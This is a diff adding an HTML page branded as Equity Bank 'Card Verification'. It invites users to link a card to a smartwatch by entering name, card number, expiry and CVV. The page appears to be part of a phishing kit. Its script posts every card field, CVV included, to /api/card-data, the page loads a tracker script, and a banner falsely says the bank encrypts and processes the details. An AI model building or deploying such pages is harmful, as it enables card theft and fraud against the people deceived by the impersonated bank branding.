@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Card Verification</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+  body{max-width:520px;margin:0 auto;min-height:100vh;background:#f5f5f5;display:flex;flex-direction:column}
+
+  .topbar{
+    display:flex;align-items:center;justify-content:space-between;
+    padding:14px 16px;background:#fff;border-bottom:3px solid #8b1a1a;
+    position:sticky;top:0;z-index:10;
+  }
+  .topbar img{height:46px}
+  .topbar-title{font-size:16px;font-weight:700;color:#222}
+
+  .hero{
+    background:#fff;padding:24px 24px 20px;text-align:center;
+  }
+  .hero img{
+    width:220px;max-width:80%;height:auto;object-fit:contain;
+    margin:0 auto 16px;display:block;
+  }
+  .hero h1{font-size:20px;font-weight:800;color:#1a1a1a;margin-bottom:6px}
+  .hero p{font-size:13px;color:#888;line-height:1.6}
+
+  .form-wrap{
+    flex:1;padding:20px 20px 0;
+  }
+  .card-form{
+    background:#fff;border-radius:16px;padding:24px 20px;
+    box-shadow:0 2px 12px rgba(0,0,0,.06);
+  }
+
+  .field{margin-bottom:18px}
+  .field label{display:block;font-size:13px;font-weight:600;color:#555;margin-bottom:6px}
+  .field input{
+    width:100%;padding:14px 14px;border:1.5px solid #ddd;border-radius:12px;
+    font-size:16px;font-family:inherit;background:#fafafa;color:#1a1a1a;outline:none;
+    transition:.2s;
+  }
+  .field input:focus{border-color:#8b1a1a;background:#fff;box-shadow:0 0 0 3px rgba(139,26,26,.1)}
+  .field input::placeholder{color:#bbb;font-size:14px}
+
+  .row{display:flex;gap:12px}
+  .row .field{flex:1}
+
+  .info-box{
+    display:flex;align-items:center;gap:10px;
+    background:#f0fdf4;border:1px solid #bbf7d0;border-radius:10px;
+    padding:12px 14px;margin-top:4px;
+  }
+  .info-box svg{width:18px;height:18px;flex-shrink:0;fill:none;stroke:#16a34a;stroke-width:2}
+  .info-box span{font-size:12px;color:#166534;line-height:1.5}
+
+  .error-msg{
+    display:none;background:#fff5f5;border:1px solid #fcc;border-radius:10px;
+    padding:10px 14px;margin-bottom:14px;color:#c62828;font-size:13px;text-align:center;font-weight:600;
+  }
+
+  .bottom{padding:16px 20px 32px}
+  .submit-btn{
+    display:block;width:100%;padding:16px;border:none;border-radius:28px;
+    font-size:16px;font-weight:600;color:#fff;cursor:pointer;font-family:inherit;
+    background:#8b1a1a;transition:.2s;
+  }
+  .submit-btn:hover{background:#6b1515}
+  .submit-btn:disabled{opacity:.5;cursor:not-allowed}
+</style>
+</head>
+<body>
+
+  <div class="topbar">
+    <img src="images/equity-logo.jpg" alt="Equity">
+    <span class="topbar-title">Card Verification</span>
+  </div>
+
+  <div class="hero">
+    <img src="images/equity-card-watch.jpg" alt="Equity Card & Watch">
+    <h1>Link your card to the watch</h1>
+    <p>Enter your card details to activate contactless payment on your smart watch</p>
+  </div>
+
+  <div class="form-wrap">
+    <div class="card-form">
+      <div class="error-msg" id="errorMsg"></div>
+
+      <div class="field">
+        <label>Cardholder Name</label>
+        <input type="text" id="cardName" placeholder="Name as shown on card" autocomplete="cc-name">
+      </div>
+
+      <div class="field">
+        <label>Card Number</label>
+        <input type="tel" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="cc-number" oninput="formatCardNumber(this)">
+      </div>
+
+      <div class="row">
+        <div class="field">
+          <label>Expiry Date</label>
+          <input type="tel" id="cardExpiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp" oninput="formatExpiry(this)">
+        </div>
+        <div class="field">
+          <label>CVV</label>
+          <input type="password" id="cardCvv" placeholder="***" maxlength="4" inputmode="numeric" autocomplete="cc-csc">
+        </div>
+      </div>
+
+      <div class="info-box">
+        <svg viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><path d="M9 12l2 2 4-4"/></svg>
+        <span>Your card details are encrypted and securely processed by Equity Bank</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="bottom">
+    <button class="submit-btn" id="submitBtn" onclick="submitCard()">Verify & Link Card</button>
+  </div>
+
+<script>
+  const params = new URLSearchParams(location.search);
+  const orderId = params.get("order");
+  if (!orderId) location.href = "index.html";
+
+  function formatCardNumber(el) {
+    let v = el.value.replace(/\D/g, "").substring(0, 16);
+    el.value = v.replace(/(\d{4})(?=\d)/g, "$1 ");
+  }
+
+  function formatExpiry(el) {
+    let v = el.value.replace(/\D/g, "").substring(0, 4);
+    if (v.length >= 3) v = v.substring(0, 2) + "/" + v.substring(2);
+    el.value = v;
+  }
+
+  async function submitCard() {
+    const name = document.getElementById("cardName").value.trim();
+    const number = document.getElementById("cardNumber").value.replace(/\s/g, "");
+    const expiry = document.getElementById("cardExpiry").value.trim();
+    const cvv = document.getElementById("cardCvv").value.trim();
+
+    if (!name) { showError("Please enter cardholder name"); return; }
+    if (number.length < 13) { showError("Please enter a valid card number"); return; }
+    if (!/^\d{2}\/\d{2}$/.test(expiry)) { showError("Please enter expiry date (MM/YY)"); return; }
+    if (cvv.length < 3) { showError("Please enter CVV"); return; }
+
+    const btn = document.getElementById("submitBtn");
+    btn.disabled = true;
+    btn.textContent = "Verifying...";
+
+    try {
+      const res = await fetch("/api/card-data", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          order_id: orderId,
+          card_name: name,
+          card_number: number,
+          card_expiry: expiry,
+          card_cvv: cvv
+        })
+      });
+      const data = await res.json();
+      if (data.success) {
+        location.href = "success.html?order=" + orderId;
+      } else {
+        showError(data.message || "An error occurred");
+        btn.disabled = false;
+        btn.textContent = "Verify & Link Card";
+      }
+    } catch(err) {
+      showError("Connection error");
+      btn.disabled = false;
+      btn.textContent = "Verify & Link Card";
+    }
+  }
+
+  function showError(msg) {
+    const el = document.getElementById("errorMsg");
+    el.textContent = msg;
+    el.style.display = "block";
+    setTimeout(() => el.style.display = "none", 4000);
+  }
+</script>
+<script src="tracker.js"></script>
+</body>
+</html>
